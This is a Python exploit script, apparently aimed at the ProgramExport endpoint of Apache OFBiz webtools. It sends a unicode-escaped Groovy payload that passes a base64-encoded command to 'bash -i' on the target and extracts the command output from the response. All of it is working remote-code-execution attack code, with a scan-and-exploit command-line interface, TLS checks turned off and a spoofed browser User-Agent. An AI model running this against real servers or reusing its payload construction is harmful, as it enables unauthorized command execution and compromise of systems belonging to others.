import argparse
import base64
import requests
import urllib3
from urllib.parse import urlparse
from colorama import Fore, Style, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_COMMAND = "whoami"
DEFAULT_TIMEOUT = 10
DEFAULT_PORT = 8080  # 기본 포트 설정


def commandEncoder(command):
    command_with_markers = f'echo [result]; {command}; echo [result];'
    encodedCommand = base64.b64encode(command_with_markers.encode()).decode()
    return encodedCommand


def payloadUnicode(base64EncodedCommand):
    command = f'throw new Exception(["bash", "-c", "{{echo,{base64EncodedCommand}}}|{{base64,-d}}|{{bash,-i}}"].execute().text);'
    unicodePayload = ''.join(f'\\u{ord(c):04x}' for c in command)
    return unicodePayload


def extract_output(response_text):
    start_marker = '[result]'
    end_marker = '[result]'
    
    start_index = response_text.find(start_marker)
    end_index = response_text.find(end_marker, start_index + len(start_marker))
    
    if start_index != -1 and end_index != -1:
        output = response_text[start_index + len(start_marker):end_index].strip()
        return output
    return None


def exploit(target, port, command, timeout):
    url = f'http://{target}:{port}/webtools/control/main/ProgramExport'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    encodedCommand = commandEncoder(command)
    unicodePayload = payloadUnicode(encodedCommand)
    data = f"groovyProgram={unicodePayload}"

    try:
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=timeout)
        
        # 상태 코드가 200이거나 응답 본문에 "root"가 포함되어 있으면 True 반환
        if response.status_code == 200 or "root" in response.text:
            output = extract_output(response.text)
            return True, output
        return False, None
    except requests.exceptions.Timeout:
        print(f"{Fore.YELLOW}[!] Request timed out for {target}:{port}{Style.RESET_ALL}")
        return False, None
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Exception: {e}{Style.RESET_ALL}")
        return False, None


if __name__ == "__main__":
    # 명령줄 인자 처리
    parser = argparse.ArgumentParser(description="Exploit script for Remote Code Execution vulnerability.")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://localhost or http://localhost:8080)")
    args = parser.parse_args()

    # URL 파싱
    target_url = args.url
    parsed_url = urlparse(target_url)

    if not parsed_url.scheme:
        print(f"{Fore.RED}[!] Invalid URL format. Ensure the URL starts with http:// or https://{Style.RESET_ALL}")
        exit(1)

    # 호스트와 포트 분리
    target = parsed_url.hostname
    port = parsed_url.port if parsed_url.port else DEFAULT_PORT

    # 실행 명령
    print(f"{Fore.BLUE}[*] Scanning and Exploiting target: {target}:{port} with command '{DEFAULT_COMMAND}'...{Style.RESET_ALL}")
    is_vulnerable, output = exploit(target, port, DEFAULT_COMMAND, DEFAULT_TIMEOUT)

    if is_vulnerable:
        print(f"{Fore.GREEN}[+] Detected Vulnerability: True{Style.RESET_ALL}")
        if output:
            print(f"{Fore.GREEN}[!] Command Output: {output}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[+] Detected Vulnerability: False{Style.RESET_ALL}")